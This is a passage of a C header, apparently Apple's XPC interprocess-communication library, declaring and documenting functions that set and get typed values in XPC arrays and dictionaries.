xpc_array_set_data(xpc_object_t xarray, size_t index,
	const void *XPC_SIZEDBY(length) bytes, size_t length);

/*!
 * @function xpc_array_set_string
 *
 * @abstract
 * Inserts a C string into an array.
 *
 * @param xarray
 * The array object which is to be manipulated.
 *
 * @param index
 * The index at which to insert the value. This value must lie within the index
 * space of the array (0 to N-1 inclusive, where N is the count of the array) or
 * be XPC_ARRAY_APPEND. If the index is outside that range, the behavior is
 * undefined.
 *
 * @param string
 * The C string to insert. After calling this method, the XPC object
 * corresponding to the primitive value inserted may be safely retrieved with
 * {@link xpc_array_get_value()}.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1 XPC_NONNULL3
void
xpc_array_set_string(xpc_object_t xarray, size_t index, const char *string);

/*!
 * @function xpc_array_set_uuid
 *
 * @abstract
 * Inserts a <code>uuid_t</code> (primitive) value into an array.
 *
 * @param xarray
 * The array object which is to be manipulated.
 *
 * @param index
 * The index at which to insert the value. This value must lie within the index
 * space of the array (0 to N-1 inclusive, where N is the count of the array) or
 * be XPC_ARRAY_APPEND. If the index is outside that range, the behavior is
 * undefined.
 *
 * @param uuid
 * The UUID primitive to insert. After calling this method, the XPC object
 * corresponding to the primitive value inserted may be safely retrieved with
 * {@link xpc_array_get_value()}.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1 XPC_NONNULL3
void
xpc_array_set_uuid(xpc_object_t xarray, size_t index,
	const uuid_t XPC_NONNULL_ARRAY uuid);

/*!
 * @function xpc_array_set_fd
 *
 * @abstract
 * Inserts a file descriptor into an array.
 *
 * @param xarray
 * The array object which is to be manipulated.
 *
 * @param index
 * The index at which to insert the value. This value must lie within the index
 * space of the array (0 to N-1 inclusive, where N is the count of the array) or
 * be XPC_ARRAY_APPEND. If the index is outside that range, the behavior is
 * undefined.
 *
 * @param fd
 * The file descriptor to insert. After calling this method, the XPC object
 * corresponding to the primitive value inserted may be safely retrieved with
 * {@link xpc_array_get_value()}.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1
void
xpc_array_set_fd(xpc_object_t xarray, size_t index, int fd);

/*!
 * @function xpc_array_set_connection
 *
 * @abstract
 * Inserts a connection into an array.
 *
 * @param xarray
 * The array object which is to be manipulated.
 *
 * @param index
 * The index at which to insert the value. This value must lie within the index
 * space of the array (0 to N-1 inclusive, where N is the count of the array) or
 * be XPC_ARRAY_APPEND. If the index is outside that range, the behavior is
 * undefined.
 *
 * @param connection
 * The connection to insert. After calling this method, the XPC object
 * corresponding to the primitive value inserted may be safely retrieved with
 * {@link xpc_array_get_value()}. The connection is NOT retained by the array.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1 XPC_NONNULL3
void
xpc_array_set_connection(xpc_object_t xarray, size_t index,
	xpc_connection_t connection);

#pragma mark Array Primitive Getters
/*!
 * @function xpc_array_get_bool
 *
 * @abstract
 * Gets a <code>bool</code> primitive value from an array directly.
 *
 * @param xarray
 * The array which is to be examined.
 *
 * @param index
 * The index of the value to obtain. This value must lie within the index space
 * of the array (0 to N-1 inclusive, where N is the count of the array). If the
 * index is outside that range, the behavior is undefined.
 *
 * @result
 * The underlying <code>bool</code> value at the specified index. false if the
 * value at the specified index is not a Boolean value.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL1
bool
xpc_array_get_bool(xpc_object_t xarray, size_t index);

/*!
 * @function xpc_array_get_int64
 *
 * @abstract
 * Gets an <code>int64_t</code> primitive value from an array directly.
 *
 * @param xarray
 * The array which is to be examined.
 *
 * @param index
 * The index of the value to obtain. This value must lie within the index space
 * of the array (0 to N-1 inclusive, where N is the count of the array). If the
 * index is outside that range, the behavior is undefined.
 *
 * @result
 * The underlying <code>int64_t</code> value at the specified index. 0 if the
 * value at the specified index is not a signed integer value. 
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL1
int64_t
xpc_array_get_int64(xpc_object_t xarray, size_t index);

/*!
 * @function xpc_array_get_uint64
 *
 * @abstract
 * Gets a <code>uint64_t</code> primitive value from an array directly.
 *
 * @param xarray
 * The array which is to be examined.
 *
 * @param index
 * The index of the value to obtain. This value must lie within the index space
 * of the array (0 to N-1 inclusive, where N is the count of the array). If the
 * index is outside that range, the behavior is undefined.
 *
 * @result
 * The underlying <code>uint64_t</code> value at the specified index. 0 if the
 * value at the specified index is not an unsigned integer value.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL1
uint64_t
xpc_array_get_uint64(xpc_object_t xarray, size_t index);

/*!
 * @function xpc_array_get_double
 *
 * @abstract
 * Gets a <code>double</code> primitive value from an array directly.
 *
 * @param xarray
 * The array which is to be examined.
 *
 * @param index
 * The index of the value to obtain. This value must lie within the index space
 * of the array (0 to N-1 inclusive, where N is the count of the array). If the
 * index is outside that range, the behavior is undefined.
 *
 * @result
 * The underlying <code>double</code> value at the specified index. NAN if the
 * value at the specified index is not a floating point value.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL1
double
xpc_array_get_double(xpc_object_t xarray, size_t index);

/*!
 * @function xpc_array_get_date
 *
 * @abstract
 * Gets a date interval from an array directly.
 *
 * @param xarray
 * The array which is to be examined.
 *
 * @param index
 * The index of the value to obtain. This value must lie within the index space
 * of the array (0 to N-1 inclusive, where N is the count of the array). If the
 * index is outside that range, the behavior is undefined.
 *
 * @result
 * The underlying date interval at the specified index. 0 if the value at the
 * specified index is not a date value.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL1
int64_t
xpc_array_get_date(xpc_object_t xarray, size_t index);

/*!
 * @function xpc_array_get_data
 *
 * @abstract
 * Gets a pointer to the raw bytes of a data object from an array directly.
 *
 * @param xarray
 * The array which is to be examined.
 *
 * @param index
 * The index of the value to obtain. This value must lie within the index space
 * of the array (0 to N-1 inclusive, where N is the count of the array). If the
 * index is outside that range, the behavior is undefined.
 *
 * @param length
 * Upon return output, will contain the length of the data corresponding to the
 * specified key.
 *
 * @result
 * The underlying bytes at the specified index. NULL if the value at the
 * specified index is not a data value.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL1
const void * _Nullable
xpc_array_get_data(xpc_object_t xarray, size_t index,
	size_t * _Nullable length);

/*!
 * @function xpc_array_get_string
 *
 * @abstract
 * Gets a C string value from an array directly.
 *
 * @param xarray
 * The array which is to be examined.
 *
 * @param index
 * The index of the value to obtain. This value must lie within the index space
 * of the array (0 to N-1 inclusive, where N is the count of the array). If the
 * index is outside that range, the behavior is undefined.
 *
 * @result
 * The underlying C string at the specified index. NULL if the value at the
 * specified index is not a C string value.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL1
const char * _Nullable
xpc_array_get_string(xpc_object_t xarray, size_t index);

/*!
 * @function xpc_array_get_uuid
 *
 * @abstract
 * Gets a <code>uuid_t</code> value from an array directly.
 *
 * @param xarray
 * The array which is to be examined.
 *
 * @param index
 * The index of the value to obtain. This value must lie within the index space
 * of the array (0 to N-1 inclusive, where N is the count of the array). If the
 * index is outside that range, the behavior is undefined.
 *
 * @result
 * The underlying <code>uuid_t</code> value at the specified index. The null
 * UUID if the value at the specified index is not a UUID value. The returned
 * pointer may be safely passed to the uuid(3) APIs.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL1
const uint8_t * _Nullable
xpc_array_get_uuid(xpc_object_t xarray, size_t index);

/*!
 * @function xpc_array_dup_fd
 *
 * @abstract
 * Gets a file descriptor from an array directly.
 *
 * @param xarray
 * The array which is to be examined.
 *
 * @param index
 * The index of the value to obtain. This value must lie within the index space
 * of the array (0 to N-1 inclusive, where N is the count of the array). If the
 * index is outside that range, the behavior is undefined.
 *
 * @result
 * A new file descriptor created from the value at the specified index. You are
 * responsible for close(2)ing this descriptor. -1 if the value at the specified
 * index is not a file descriptor value.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL1
int
xpc_array_dup_fd(xpc_object_t xarray, size_t index);

/*!
 * @function xpc_array_create_connection
 *
 * @abstract
 * Creates a connection object from an array directly.
 *
 * @param xarray
 * The array which is to be examined.
 *
 * @param index
 * The index of the value to obtain. This value must lie within the index space
 * of the array (0 to N-1 inclusive, where N is the count of the array). If the
 * index is outside that range, the behavior is undefined.
 *
 * @result
 * A new connection created from the value at the specified index. You are
 * responsible for calling xpc_release() on the returned connection. NULL if the
 * value at the specified index is not an endpoint containing a connection. Each
 * call to this method for the same index in the same array will yield a
 * different connection. See {@link xpc_connection_create_from_endpoint()} for
 * discussion as to the responsibilities when dealing with the returned
 * connection.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_MALLOC XPC_RETURNS_RETAINED XPC_WARN_RESULT XPC_NONNULL1
xpc_connection_t _Nullable
xpc_array_create_connection(xpc_object_t xarray, size_t index);

/*!
 * @function xpc_array_get_dictionary
 *
 * @abstract
 * Returns the dictionary at the specified index in the array.
 *
 * @param xarray
 * The array object which is to be examined.
 *
 * @param index
 * The index of the value to obtain. This value must lie within the range of
 * indexes as specified in xpc_array_set_value().
 * 
 * @result
 * The object at the specified index within the array or NULL if the given
 * object was not an XPC array or if the the value at the specified index was
 * not a dictionary.
 *
 * @discussion
 * This method does not grant the caller a reference to the underlying object,
 * and thus the caller is not responsible for releasing the object.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_11, __IPHONE_9_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL_ALL
xpc_object_t _Nullable
xpc_array_get_dictionary(xpc_object_t xarray, size_t index);

/*!
 * @function xpc_array_get_array
 *
 * @abstract
 * Returns the array at the specified index in the array.
 *
 * @param xarray
 * The array object which is to be examined.
 *
 * @param index
 * The index of the value to obtain. This value must lie within the range of
 * indexes as specified in xpc_array_set_value().
 * 
 * @result
 * The object at the specified index within the array or NULL if the given
 * object was not an XPC array or if the the value at the specified index was
 * not an array.
 *
 * @discussion
 * This method does not grant the caller a reference to the underlying object,
 * and thus the caller is not responsible for releasing the object.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_11, __IPHONE_9_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL_ALL
xpc_object_t _Nullable
xpc_array_get_array(xpc_object_t xarray, size_t index);

#pragma mark Dictionary
/*!
 * @typedef xpc_dictionary_applier_t
 * A block to be invoked for every key/value pair in the dictionary.
 *
 * @param key
 * The current key in the iteration.
 *
 * @param value
 * The current value in the iteration.
 *
 * @result
 * A Boolean indicating whether iteration should continue.
 */
#ifdef __BLOCKS__
typedef bool (^xpc_dictionary_applier_t)(const char * _Nonnull key,
		xpc_object_t _Nonnull value);
#endif // __BLOCKS__ 

/*!
 * @function xpc_dictionary_create
 *
 * @abstract
 * Creates an XPC object representing a dictionary of XPC objects keyed to
 * C-strings.
 *
 * @param keys
 * An array of C-strings that are to be the keys for the values to be inserted.
 * Each element of this array is copied into the dictionary's internal storage.
 * Elements of this array may NOT be NULL.
 *
 * @param values
 * A C-array that is parallel to the array of keys, consisting of objects that
 * are to be inserted. Each element in this array is retained. Elements in this
 * array may be NULL.
 *
 * @param count
 * The number of key/value pairs in the given arrays. If the count is less than
 * the actual count of values, only that many key/value pairs will be inserted
 * into the dictionary.
 *
 * If the count is more than the the actual count of key/value pairs, the
 * behavior is undefined. If one array is NULL and the other is not, the 
 * behavior is undefined. If both arrays are NULL and the count is non-0, the
 * behavior is undefined.
 *
 * @result
 * The new dictionary object.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_MALLOC XPC_RETURNS_RETAINED XPC_WARN_RESULT
xpc_object_t
xpc_dictionary_create(
	const char *XPC_CSTRING _Nonnull const *XPC_COUNTEDBY(count) _Nullable keys,
	const xpc_object_t _Nullable *XPC_COUNTEDBY(count) _Nullable values, size_t count);

/*!
 * @function xpc_dictionary_create_empty
 *
 * @abstract
 * Creates an XPC object representing a dictionary of XPC objects keyed to
 * C-strings.
 *
 * @result
 * The new dictionary object.
 *
 * @see
 * xpc_dictionary_create
 */
API_AVAILABLE(macos(11.0), ios(14.0), tvos(14.0), watchos(7.0))
XPC_EXPORT XPC_MALLOC XPC_RETURNS_RETAINED XPC_WARN_RESULT
xpc_object_t
xpc_dictionary_create_empty(void);

/*!
 * @function xpc_dictionary_create_reply
 * 
 * @abstract
 * Creates a dictionary that is in reply to the given dictionary.
 *
 * @param original
 * The original dictionary that is to be replied to.
 *
 * @result
 * The new dictionary object. NULL if the object was not a dictionary with a
 * reply context.
 *
 * @discussion
 * After completing successfully on a dictionary, this method may not be called
 * again on that same dictionary. Attempts to do so will return NULL.
 *
 * When this dictionary is sent across the reply connection, the remote end's
 * reply handler is invoked.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_MALLOC XPC_RETURNS_RETAINED XPC_WARN_RESULT XPC_NONNULL_ALL
xpc_object_t _Nullable
xpc_dictionary_create_reply(xpc_object_t original);

/*!
 * @function xpc_dictionary_set_value
 *
 * @abstract
 * Sets the value for the specified key to the specified object.
 *
 * @param xdict
 * The dictionary object which is to be manipulated.
 *
 * @param key
 * The key for which the value shall be set.
 *
 * @param value
 * The object to insert. The object is retained by the dictionary. If there
 * already exists a value for the specified key, the old value is released
 * and overwritten by the new value. This parameter may be NULL, in which case
 * the value corresponding to the specified key is deleted if present.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1 XPC_NONNULL2
void
xpc_dictionary_set_value(xpc_object_t xdict, const char *key,
	xpc_object_t _Nullable value);

/*!
 * @function xpc_dictionary_get_value
 *
 * @abstract
 * Returns the value for the specified key.
 *
 * @param xdict
 * The dictionary object which is to be examined.
 *
 * @param key
 * The key whose value is to be obtained.
 * 
 * @result
 * The object for the specified key within the dictionary. NULL if there is no
 * value associated with the specified key or if the given object was not an
 * XPC dictionary.
 *
 * @discussion
 * This method does not grant the caller a reference to the underlying object,
 * and thus the caller is not responsible for releasing the object.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL1 XPC_NONNULL2
xpc_object_t _Nullable
xpc_dictionary_get_value(xpc_object_t xdict, const char *key);

/*!
 * @function xpc_dictionary_get_count
 *
 * @abstract
 * Returns the number of values stored in the dictionary.
 *
 * @param xdict
 * The dictionary object which is to be examined.
 *
 * @result
 * The number of values stored in the dictionary or 0 if the given object was 
 * not an XPC dictionary. Calling xpc_dictionary_set_value() with a non-NULL
 * value will increment the count. Calling xpc_dictionary_set_value() with a 
 * NULL value will decrement the count.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL1
size_t
xpc_dictionary_get_count(xpc_object_t xdict);

/*!
 * @function xpc_dictionary_apply
 *
 * @abstract
 * Invokes the given block for every key/value pair in the dictionary.
 *
 * @param xdict
 * The dictionary object which is to be examined.
 *
 * @param applier
 * The block which this function applies to every key/value pair in the 
 * dictionary.
 * 
 * @result
 * A Boolean indicating whether iteration of the dictionary completed
 * successfully. Iteration will only fail if the applier block returns false.
 *
 * @discussion
 * You should not modify a dictionary's contents during iteration. There is no
 * guaranteed order of iteration over dictionaries.
 */
#ifdef __BLOCKS__
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL_ALL
bool
xpc_dictionary_apply(xpc_object_t xdict,
		XPC_NOESCAPE xpc_dictionary_applier_t applier);
#endif // __BLOCKS__ 

/*!
 * @function xpc_dictionary_get_remote_connection
 *
 * @abstract
 * Returns the connection from which the dictionary was received.
 *
 * @param xdict
 * The dictionary object which is to be examined.
 *
 * @result
 * If the dictionary was received by a connection event handler or a dictionary
 * created through xpc_dictionary_create_reply(), a connection object over which
 * a reply message can be sent is returned. For any other dictionary, NULL is
 * returned.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL_ALL
xpc_connection_t _Nullable
xpc_dictionary_get_remote_connection(xpc_object_t xdict);

#pragma mark Dictionary Primitive Setters
/*!
 * @function xpc_dictionary_set_bool
 *
 * @abstract
 * Inserts a <code>bool</code> (primitive) value into a dictionary.
 *
 * @param xdict
 * The dictionary which is to be manipulated.
 *
 * @param key
 * The key for which the primitive value shall be set.
 *
 * @param value
 * The <code>bool</code> value to insert. After calling this method, the XPC
 * object corresponding to the primitive value inserted may be safely retrieved
 * with {@link xpc_dictionary_get_value()}.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1 XPC_NONNULL2
void
xpc_dictionary_set_bool(xpc_object_t xdict, const char *key, bool value);

/*!
 * @function xpc_dictionary_set_int64
 *
 * @abstract
 * Inserts an <code>int64_t</code> (primitive) value into a dictionary.
 *
 * @param xdict
 * The dictionary which is to be manipulated.
 *
 * @param key
 * The key for which the primitive value shall be set.
 *
 * @param value
 * The <code>int64_t</code> value to insert. After calling this method, the XPC
 * object corresponding to the primitive value inserted may be safely retrieved
 * with {@link xpc_dictionary_get_value()}.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1 XPC_NONNULL2
void
xpc_dictionary_set_int64(xpc_object_t xdict, const char *key, int64_t value);

/*!
 * @function xpc_dictionary_set_uint64
 *
 * @abstract
 * Inserts a <code>uint64_t</code> (primitive) value into a dictionary.
 *
 * @param xdict
 * The dictionary which is to be manipulated.
 *
 * @param key
 * The key for which the primitive value shall be set.
 *
 * @param value
 * The <code>uint64_t</code> value to insert. After calling this method, the XPC
 * object corresponding to the primitive value inserted may be safely retrieved
 * with {@link xpc_dictionary_get_value()}.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1 XPC_NONNULL2
void
xpc_dictionary_set_uint64(xpc_object_t xdict, const char *key, uint64_t value);

/*!
 * @function xpc_dictionary_set_double
 *
 * @abstract
 * Inserts a <code>double</code> (primitive) value into a dictionary.
 *
 * @param xdict
 * The dictionary which is to be manipulated.
 *
 * @param key
 * The key for which the primitive value shall be set.
 *
 * @param value
 * The <code>double</code> value to insert. After calling this method, the XPC
 * object corresponding to the primitive value inserted may be safely retrieved
 * with {@link xpc_dictionary_get_value()}.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1 XPC_NONNULL2
void
xpc_dictionary_set_double(xpc_object_t xdict, const char *key, double value);

/*!
 * @function xpc_dictionary_set_date
 *
 * @abstract
 * Inserts a date (primitive) value into a dictionary.
 *
 * @param xdict
 * The dictionary which is to be manipulated.
 *
 * @param key
 * The key for which the primitive value shall be set.
 *
 * @param value
 * The date value to insert. After calling this method, the XPC object
 * corresponding to the primitive value inserted may be safely retrieved with
 * {@link xpc_dictionary_get_value()}.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1 XPC_NONNULL2
void
xpc_dictionary_set_date(xpc_object_t xdict, const char *key, int64_t value);

/*!
 * @function xpc_dictionary_set_data
 *
 * @abstract
 * Inserts a raw data value into a dictionary.
 *
 * @param xdict
 * The dictionary which is to be manipulated.
 *
 * @param key
 * The key for which the primitive value shall be set.
 *
 * @param bytes
 * The bytes to insert. After calling this method, the XPC object corresponding
 * to the primitive value inserted may be safely retrieved with
 * {@link xpc_dictionary_get_value()}.
 *
 * @param length
 * The length of the data.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1 XPC_NONNULL2 XPC_NONNULL3
void
xpc_dictionary_set_data(xpc_object_t xdict, const char *key,
	const void *XPC_SIZEDBY(length) bytes, size_t length);

/*!
 * @function xpc_dictionary_set_string
 *
 * @abstract
 * Inserts a C string value into a dictionary.
 *
 * @param xdict
 * The dictionary which is to be manipulated.
 *
 * @param key
 * The key for which the primitive value shall be set.
 *
 * @param string
 * The C string to insert. After calling this method, the XPC object 
 * corresponding to the primitive value inserted may be safely retrieved with
 * {@link xpc_dictionary_get_value()}.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1 XPC_NONNULL2 XPC_NONNULL3
void
xpc_dictionary_set_string(xpc_object_t xdict, const char *key,
	const char *string);

/*!
 * @function xpc_dictionary_set_uuid
 *
 * @abstract
 * Inserts a uuid (primitive) value into an array.
 *
 * @param xdict
 * The dictionary which is to be manipulated.
 *
 * @param key
 * The key for which the primitive value shall be set.
 *
 * @param uuid
 * The <code>uuid_t</code> value to insert. After calling this method, the XPC
 * object corresponding to the primitive value inserted may be safely retrieved
 * with {@link xpc_dictionary_get_value()}.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1 XPC_NONNULL2 XPC_NONNULL3
void
xpc_dictionary_set_uuid(xpc_object_t xdict, const char *key,
	const uuid_t XPC_NONNULL_ARRAY uuid);

/*!
 * @function xpc_dictionary_set_fd
 *
 * @abstract
 * Inserts a file descriptor into a dictionary.
 *
 * @param xdict
 * The dictionary which is to be manipulated.
 *
 * @param key
 * The key for which the primitive value shall be set.
 *
 * @param fd
 * The file descriptor to insert. After calling this method, the XPC object
 * corresponding to the primitive value inserted may be safely retrieved
 * with {@link xpc_dictionary_get_value()}.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1 XPC_NONNULL2
void
xpc_dictionary_set_fd(xpc_object_t xdict, const char *key, int fd);

/*!
 * @function xpc_dictionary_set_connection
 *
 * @abstract
 * Inserts a connection into a dictionary.
 *
 * @param xdict
 * The dictionary which is to be manipulated.
 *
 * @param key
 * The key for which the primitive value shall be set.
 *
 * @param connection
 * The connection to insert. After calling this method, the XPC object
 * corresponding to the primitive value inserted may be safely retrieved
 * with {@link xpc_dictionary_get_value()}. The connection is NOT retained by
 * the dictionary.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_NONNULL1 XPC_NONNULL2 XPC_NONNULL3
void
xpc_dictionary_set_connection(xpc_object_t xdict, const char *key,
	xpc_connection_t connection);

#pragma mark Dictionary Primitive Getters
/*!
 * @function xpc_dictionary_get_bool
 *
 * @abstract
 * Gets a <code>bool</code> primitive value from a dictionary directly.
 *
 * @param xdict
 * The dictionary object which is to be examined.
 *
 * @param key
 * The key whose value is to be obtained.
 *
 * @result
 * The underlying <code>bool</code> value for the specified key. false if the
 * the value for the specified key is not a Boolean value or if there is no
 * value for the specified key.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL_ALL
bool
xpc_dictionary_get_bool(xpc_object_t xdict, const char *key);

/*!
 * @function xpc_dictionary_get_int64
 *
 * @abstract
 * Gets an <code>int64</code> primitive value from a dictionary directly.
 *
 * @param xdict
 * The dictionary object which is to be examined.
 *
 * @param key
 * The key whose value is to be obtained.
 *
 * @result
 * The underlying <code>int64_t</code> value for the specified key. 0 if the
 * value for the specified key is not a signed integer value or if there is no
 * value for the specified key.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL_ALL
int64_t
xpc_dictionary_get_int64(xpc_object_t xdict, const char *key);

/*!
 * @function xpc_dictionary_get_uint64
 *
 * @abstract
 * Gets a <code>uint64</code> primitive value from a dictionary directly.
 *
 * @param xdict
 * The dictionary object which is to be examined.
 *
 * @param key
 * The key whose value is to be obtained.
 *
 * @result
 * The underlying <code>uint64_t</code> value for the specified key. 0 if the
 * value for the specified key is not an unsigned integer value or if there is
 * no value for the specified key.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL_ALL
uint64_t
xpc_dictionary_get_uint64(xpc_object_t xdict, const char *key);

/*!
 * @function xpc_dictionary_get_double
 *
 * @abstract
 * Gets a <code>double</code> primitive value from a dictionary directly.
 *
 * @param xdict
 * The dictionary object which is to be examined.
 *
 * @param key
 * The key whose value is to be obtained.
 *
 * @result
 * The underlying <code>double</code> value for the specified key. NAN if the
 * value for the specified key is not a floating point value or if there is no
 * value for the specified key.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL_ALL
double
xpc_dictionary_get_double(xpc_object_t xdict, const char *key);

/*!
 * @function xpc_dictionary_get_date
 *
 * @abstract
 * Gets a date value from a dictionary directly.
 *
 * @param xdict
 * The dictionary object which is to be examined.
 *
 * @param key
 * The key whose value is to be obtained.
 *
 * @result
 * The underlying date interval for the specified key. 0 if the value for the
 * specified key is not a date value or if there is no value for the specified
 * key.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL_ALL
int64_t
xpc_dictionary_get_date(xpc_object_t xdict, const char *key);

/*!
 * @function xpc_dictionary_get_data
 *
 * @abstract
 * Gets a raw data value from a dictionary directly.
 *
 * @param xdict
 * The dictionary object which is to be examined.
 *
 * @param key
 * The key whose value is to be obtained.
 *
 * @param length
 * For the data type, the third parameter, upon output, will contain the length
 * of the data corresponding to the specified key. May be NULL.
 *
 * @result
 * The underlying raw data for the specified key. NULL if the value for the
 * specified key is not a data value or if there is no value for the specified
 * key.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL1
const void * _Nullable
xpc_dictionary_get_data(xpc_object_t xdict, const char *key,
	size_t * _Nullable length);

/*!
 * @function xpc_dictionary_get_string
 *
 * @abstract
 * Gets a C string value from a dictionary directly.
 *
 * @param xdict
 * The dictionary object which is to be examined.
 *
 * @param key
 * The key whose value is to be obtained.
 *
 * @result
 * The underlying C string for the specified key. NULL if the value for the
 * specified key is not a C string value or if there is no value for the
 * specified key.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL_ALL
const char * _Nullable
xpc_dictionary_get_string(xpc_object_t xdict, const char *key);

/*!
 * @function xpc_dictionary_get_uuid
 *
 * @abstract
 * Gets a uuid value from a dictionary directly.
 *
 * @param xdict
 * The dictionary object which is to be examined.
 *
 * @param key
 * The key whose value is to be obtained.
 *
 * @result
 * The underlying <code>uuid_t</code> value for the specified key. NULL is the
 * value at the specified index is not a UUID value. The returned pointer may be
 * safely passed to the uuid(3) APIs.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL1 XPC_NONNULL2
const uint8_t * _Nullable
xpc_dictionary_get_uuid(xpc_object_t xdict, const char *key);

/*!
 * @function xpc_dictionary_dup_fd
 *
 * @abstract
 * Creates a file descriptor from a dictionary directly.
 *
 * @param xdict
 * The dictionary object which is to be examined.
 *
 * @param key
 * The key whose value is to be obtained.
 *
 * @result
 * A new file descriptor created from the value for the specified key. You are
 * responsible for close(2)ing this descriptor. -1 if the value for the
 * specified key is not a file descriptor value or if there is no value for the
 * specified key.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_WARN_RESULT XPC_NONNULL_ALL
int
xpc_dictionary_dup_fd(xpc_object_t xdict, const char *key);

/*!
 * @function xpc_dictionary_create_connection
 *
 * @abstract
 * Creates a connection from a dictionary directly.
 *
 * @param xdict
 * The dictionary object which is to be examined.
 *
 * @param key
 * The key whose value is to be obtained.
 *
 * @result
 * A new connection created from the value for the specified key. You are
 * responsible for calling xpc_release() on the returned connection. NULL if the
 * value for the specified key is not an endpoint containing a connection or if
 * there is no value for the specified key. Each call to this method for the
 * same key in the same dictionary will yield a different connection. See
 * {@link xpc_connection_create_from_endpoint()} for discussion as to the
 * responsibilities when dealing with the returned connection.
 */
__OSX_AVAILABLE_STARTING(__MAC_10_7, __IPHONE_5_0)
XPC_EXPORT XPC_MALLOC XPC_RETURNS_RETAINED XPC_WARN_RESULT XPC_NONNULL_ALL
xpc_connection_t _Nullable
xpc_dictionary_create_connection(xpc_object_t xdict, const char *key);

/*!
 * @function xpc_dictionary_get_dictionary
 *
 * @abstract
 * Returns the dictionary value for the specified key.
 *
 * @param xdict
 * The dictionary object which is to be examined.
 *
 * @param key
 * The key whose value is to be obtained.
 * 
 * @result
